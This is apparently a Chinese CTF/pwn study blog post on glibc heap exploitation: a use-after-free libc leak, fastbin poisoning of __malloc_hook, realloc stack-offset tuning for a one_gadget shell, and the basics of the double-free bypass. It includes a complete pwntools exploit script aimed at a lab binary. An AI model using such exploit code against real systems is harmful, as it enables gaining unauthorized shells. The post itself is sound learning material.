+<p>![423D573C-20FD-47C7-9B95-65950318E42A](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/423D573C-20FD-47C7-9B95-65950318E42A.png)</p>
+<p>此时如果再add，就会执行到malloc_hook处，转而执行one_gadget。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">6</span>,<span class="number">0x68</span>)</span><br></pre></td></tr></table></figure>
+
+<p>直接这样add不行，会导致程序崩溃。</p>
+<p>把断点下在add()处</p>
+<p>![322B932D-C3B6-41CD-A854-4214BDD553B7](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/322B932D-C3B6-41CD-A854-4214BDD553B7.png)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">debug(<span class="number">0x40094F</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x68</span>)</span><br></pre></td></tr></table></figure>
+
+<p>[发现使用debug可以直接进行调试，不用再使用 ps -aux | grep “name” &amp; sudo gdb attach XXX]</p>
+<p>c，继续执行，就会到我们下断点的地方，是add()函数。s步入。</p>
+<p>找到malloc函数，我们申请的大小是0x68。</p>
+<p>![45E6D6F0-CA87-4A38-902A-88841DFAEF33](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/45E6D6F0-CA87-4A38-902A-88841DFAEF33.png)</p>
+<p>si进入。调用malloc的时候会调用malloc_hook</p>
+<p>![23C05623-DE95-4F9C-A2BC-417238702E18](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/23C05623-DE95-4F9C-A2BC-417238702E18.png)</p>
+<p>再次si进入。发现会调用/bin/sh。</p>
+<p>![44688A35-4FFC-48AE-BAB3-CD5F3BC378A7](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/44688A35-4FFC-48AE-BAB3-CD5F3BC378A7.png)</p>
+<p>stack 查看栈上的内容。使用one_gadget需要满足的条件是：栈上30 50 70的位置要为0。</p>
+<p>由于30 50 70处的值都不是0，所以不能getshell</p>
+<p>![8058343A-5B6B-4239-A0E3-952B3DEF56F2](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/8058343A-5B6B-4239-A0E3-952B3DEF56F2.png)</p>
+<p>解决方法1：思考malloc的时候的size能不能控制</p>
+<p>ida查看 由于size输入的是整型，我们不能直接修改为/bin/sh，理论上是不可以的。</p>
+<p>![6BB885C4-6DF7-4DBA-80AD-C300CFFADEEF](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/6BB885C4-6DF7-4DBA-80AD-C300CFFADEEF.png)</p>
+<p>验证脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">py = <span class="string">&#x27;&#x27;</span></span><br><span class="line">py+= <span class="string">&#x27;a&#x27;</span>*<span class="number">0x13</span> + p64(system) + <span class="string">&#x27;\n&#x27;</span>  <span class="comment">#原来的one_gadget 修改为system</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x40</span>,py)</span><br><span class="line"></span><br><span class="line">debug(<span class="number">0x400AD2</span>,<span class="number">0</span>) <span class="comment">#断点改为malloc的地址，如下</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>,<span class="string">&#x27;$0&#x27;</span>) <span class="comment">#即/bin/sh</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>![36D121B9-ACF6-43AE-9303-D6BE2525851C](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/36D121B9-ACF6-43AE-9303-D6BE2525851C.png)</p>
+<p>进入malloc，jmp rax的时候会执行到system。</p>
+<p>![40882515-B4DC-4842-A591-7769AF16128B](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/40882515-B4DC-4842-A591-7769AF16128B.png)</p>
+<p>![E9DC2947-8ED3-4D46-8548-2523DC95092A](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/E9DC2947-8ED3-4D46-8548-2523DC95092A.png)</p>
+<p>但是由于system的参数是/bin/sh，而要求输入的是整型，所以会出错，程序结束。此方法不通。所以还是需要用one_gadget。</p>
+<p>解决方法2: 使用 realloc</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">realloc = libc_base + libc.sym[<span class="string">&quot;realloc&quot;</span>]</span><br><span class="line">...</span><br><span class="line">py = <span class="string">&#x27;&#x27;</span></span><br><span class="line">py+= <span class="string">&#x27;a&#x27;</span>*<span class="number">11</span> + p64(one_gadget) + p64(realloc) + <span class="string">&#x27;\n&#x27;</span>  <span class="comment">#原来填充的是0x13即19，现在填充11，realloc的地址上写上one_gadet。</span></span><br><span class="line">...</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x68</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里出现了错误，程序终止运行，不知道为什么。后来修改了add的块的个数，即前面add(0)和add(1)，没有add(2)，可以正常运行。</p>
+<p>代码如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x108</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x108</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">libc_base = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;libc_base ---&gt;&quot;</span> + hex(libc_base) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).next()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;system ---&gt;&quot;</span> + hex(system) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;binsh ---&gt;&quot;</span> + hex(binsh) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------one_gadget:0x45226 0x4527a 0xf0364 0xf1207------------</span></span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0xf0364</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;one_gadget ---&gt;&quot;</span> + hex(one_gadget) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&quot;realloc&quot;</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;malloc_hook ---&gt;&quot;</span> + hex(malloc_hook)</span><br><span class="line">                                                         <span class="number">49</span>,<span class="number">1</span>          <span class="number">61</span>%</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;realloc ---&gt;&quot;</span> + hex(realloc)</span><br><span class="line">fake_chunk = malloc_hook - <span class="number">0x23</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;fake_chunk ---&gt; &quot;</span> + hex(fake_chunk)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x8</span>,p64(fake_chunk))</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">py = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#py += &#x27;a&#x27;*0x23 + p64(one_gadget) + &#x27;\n&#x27;</span></span><br><span class="line">py+= <span class="string">&#x27;a&#x27;</span>*<span class="number">11</span> + p64(one_gadget) + p64(realloc) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x40</span>,py)</span><br><span class="line"></span><br><span class="line">debug(<span class="number">0x400AD2</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">                </span><br></pre></td></tr></table></figure>
+
+
+
+<p>![image-20201228125433613](/Users/my/Library/Application Support/typora-user-images/image-20201228125433613.png)</p>
+<p>即malloc的时候跳转到__malloc_hook，再跳转到realloc，再跳到one_gadget。</p>
+<p>执行realloc的之后会有一些push，这些push的作用就是使得栈上的偏移发生变化。</p>
+<p>![C88D1C80-77C0-4D69-A449-8FE8177F79EE](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/C88D1C80-77C0-4D69-A449-8FE8177F79EE.png)</p>
+<p>此时不能getshell，因为栈上的偏移不为0。</p>
+<p>![1DC625A6-5594-4D28-B856-FD3797E1C671](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/1DC625A6-5594-4D28-B856-FD3797E1C671.png)</p>
+<p>关于寄存器</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%rax 作为函数返回值使用。</span><br><span class="line">%rsp 栈指针寄存器，指向栈顶</span><br><span class="line">%rdi，%rsi，%rdx，%rcx，%r8，%r9 用作函数参数，依次对应第1参数，第2参数。。。</span><br><span class="line">%rbx，%rbp，%r12，%r13，%14，%15 用作数据存储，遵循被调用者使用规则，简单说就是随便用，调用子函数之前要备份它，以防他被修改</span><br><span class="line">%r10，%r11 用作数据存储，遵循调用者使用规则，简单说就是使用之前要先保存原值</span><br></pre></td></tr></table></figure>
+
+
+
+<p>下面需要继续调偏移</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py+= <span class="string">&#x27;a&#x27;</span>*<span class="number">11</span> + p64(one_gadget) + p64(realloc+<span class="number">1</span>) + <span class="string">&#x27;\n&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>调试</p>
+<p>![image-20201228132017948](/Users/my/Library/Application Support/typora-user-images/image-20201228132017948.png)</p>
+<p>可能哪里出错啦</p>
+<p>![image-20201228132216462](/Users/my/Library/Application Support/typora-user-images/image-20201228132216462.png)</p>
+<p>栈偏移修改为2</p>
+<p>![CA8DDF77-8783-4939-A26D-E57F125E07E2](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/CA8DDF77-8783-4939-A26D-E57F125E07E2.png)</p>
+<p>这时发现！！70处的值为0！！！</p>
+<p>![994F726F-65FA-485E-A2BC-F2642EA3B294](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/994F726F-65FA-485E-A2BC-F2642EA3B294.png)</p>
+<p>此时one_adget 要找70处的偏移。</p>
+<p>![image-20201228133805378](/Users/my/Library/Application Support/typora-user-images/image-20201228133805378.png)</p>
+<p>修改one_gadget的值</p>
+<p><code>one_gadget = libc_base + 0xf1207</code></p>
+<p>这时realloc从+2开始，相当于最开始少了一个push。</p>
+<p>![image-20201228134037885](/Users/my/Library/Application Support/typora-user-images/image-20201228134037885.png)</p>
+<p>再查看栈上的内容，发现参数的70的位置变成了0</p>
+<p>![image-20201228134258354](/Users/my/Library/Application Support/typora-user-images/image-20201228134258354.png)</p>
+<p>即argv位置参数为0</p>
+<p>![image-20201228134453897](/Users/my/Library/Application Support/typora-user-images/image-20201228134453897.png)</p>
+<p>getshell!!!!!!!!!!!!!!!!!!!!!!</p>
+<p>![image-20201228134645459](/Users/my/Library/Application Support/typora-user-images/image-20201228134645459.png)</p>
+<p>完整的exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./chunk&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">&#x27;./chunk&#x27;</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.16.229.161&#x27;</span>,<span class="number">7001</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#onegadget64(libc.so.6)  0x45216  0x4526a  0xf02a4  0xf1147</span></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span>(<span class="params">addr</span>):</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *&quot;</span>+str(hex(addr)))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>(<span class="params">addr,PIE=True</span>):</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">&quot;pmap &#123;&#125;| awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">&#x27;b *&#123;&#125;&#x27;</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">&quot;b *&#123;&#125;&quot;</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size</span>):</span></span><br><span class="line">    ru(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&quot;Give me a book ID: &quot;</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">&quot;how long: &quot;</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    ru(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&quot;Which book do you want to show?&quot;</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    ru(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&quot;Which one to throw?&quot;</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,size,py</span>):</span></span><br><span class="line">    ru(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&quot;Which book to write?&quot;</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">&quot;how big?&quot;</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    sd(py)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x108</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x108</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">libc_base = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;libc_base ---&gt;&quot;</span> + hex(libc_base) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).next()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;system ---&gt;&quot;</span> + hex(system) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;binsh ---&gt;&quot;</span> + hex(binsh) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------one_gadget:0x45226 0x4527a 0xf0364 0xf1207------------</span></span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0xf1207</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;one_gadget ---&gt;&quot;</span> + hex(one_gadget) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&quot;realloc&quot;</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;malloc_hook ---&gt;&quot;</span> + hex(malloc_hook)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;realloc ---&gt;&quot;</span> + hex(realloc)</span><br><span class="line">fake_chunk = malloc_hook - <span class="number">0x23</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;fake_chunk ---&gt; &quot;</span> + hex(fake_chunk)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x8</span>,p64(fake_chunk))</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">py = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#py += &#x27;a&#x27;*0x23 + p64(one_gadget) + &#x27;\n&#x27;</span></span><br><span class="line">py+= <span class="string">&#x27;a&#x27;</span>*<span class="number">11</span> + p64(one_gadget) + p64(realloc+<span class="number">2</span>) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"><span class="keyword">print</span> py + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x40</span>,py)</span><br><span class="line"></span><br><span class="line">debug(<span class="number">0x400AD2</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">                             </span><br></pre></td></tr></table></figure>
+
+
+
+<p>到上面其实都还是uaf，下面才是double free</p>
+<h3 id="double-free-1"><a href="#double-free-1" class="headerlink" title="double free"></a>double free</h3><p>同一个堆块，如果连续free两次，会报错。</p>
+<p>![CB388C6D-5D73-49D4-8C56-A75E208CC09E](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/CB388C6D-5D73-49D4-8C56-A75E208CC09E.png)</p>
+<p>源码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line"> &#123; errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>; </span><br><span class="line"><span class="keyword">goto</span> errout; &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>old是上次free的堆块，p是这次free的。如果连个相等，则报错。所以绕过机制为：在两次free中间夹一次free其它堆块。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>free掉1号块之后</p>
+<p>![33292192-B691-4C07-A406-430DEB639D1E](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/33292192-B691-4C07-A406-430DEB639D1E.png)</p>
+<p>两个堆块都是free状态</p>
+<p>![E2676986-D309-4602-98FC-320B804B0CCC](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/E2676986-D309-4602-98FC-320B804B0CCC.png)</p>
+<p>再次free(0)，可以看到两个堆块相互指着</p>
+<p>![48415223-8B26-4AB1-9879-436077DE7117](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/48415223-8B26-4AB1-9879-436077DE7117.png)</p>
+<p>堆块的使用状态如下</p>
+<p>![6CD263C3-CEDB-4658-ABC8-E642B0185715](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/6CD263C3-CEDB-4658-ABC8-E642B0185715.png)</p>
+<p>如果此时再分别add两个堆块2，3号。</p>
+<p>add 2号堆块之后，把原来的0x603000，即0号堆块分配给了2号。</p>
+<p>![F972B911-DFDE-49EE-A6BE-8B0384A9DD0F](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/F972B911-DFDE-49EE-A6BE-8B0384A9DD0F.png)</p>
+<p>telescope可验证如下</p>
+<img src="/2020/11/25/%E5%A0%86%E6%BA%A2%E5%87%BA/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/5CD72EAF-2D97-47E0-A242-8CA81F58C67F.png" class="lazyload" data-srcset="/2020/11/25/%E5%A0%86%E6%BA%A2%E5%87%BA/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/5CD72EAF-2D97-47E0-A242-8CA81F58C67F.png" srcset="data:image/png;base64,666" alt="5CD72EAF-2D97-47E0-A242-8CA81F58C67F" style="zoom:50%;">
+
+<p>再add 3号块</p>
+<img src="/2020/11/25/%E5%A0%86%E6%BA%A2%E5%87%BA/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/2B62A9A2-02E3-4294-B725-08ECE8E07741.png" class="lazyload" data-srcset="/2020/11/25/%E5%A0%86%E6%BA%A2%E5%87%BA/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/2B62A9A2-02E3-4294-B725-08ECE8E07741.png" srcset="data:image/png;base64,666" alt="2B62A9A2-02E3-4294-B725-08ECE8E07741" style="zoom:50%;">
+
+<img src="/2020/11/25/%E5%A0%86%E6%BA%A2%E5%87%BA/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/4B33965F-3E98-433C-AC7D-A02E89CAED8E.png" class="lazyload" data-srcset="/2020/11/25/%E5%A0%86%E6%BA%A2%E5%87%BA/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/4B33965F-3E98-433C-AC7D-A02E89CAED8E.png" srcset="data:image/png;base64,666" alt="4B33965F-3E98-433C-AC7D-A02E89CAED8E" style="zoom:67%;">
+
+
+
+<p>再次add许多堆块，发现不管add多少，都只是在这些0，1两个堆块之间反复申请。</p>
+<img src="/2020/11/25/%E5%A0%86%E6%BA%A2%E5%87%BA/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/59F2CDED-62D5-42EF-9754-2875DA60C312.png" class="lazyload" data-srcset="/2020/11/25/%E5%A0%86%E6%BA%A2%E5%87%BA/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/59F2CDED-62D5-42EF-9754-2875DA60C312.png" srcset="data:image/png;base64,666" alt="59F2CDED-62D5-42EF-9754-2875DA60C312" style="zoom:50%;">
+
+
+
+<p>对于刚才add的2号块，已知分配给它的是free掉的0号块。如果edit，即可以修改其fd处的值。</p>
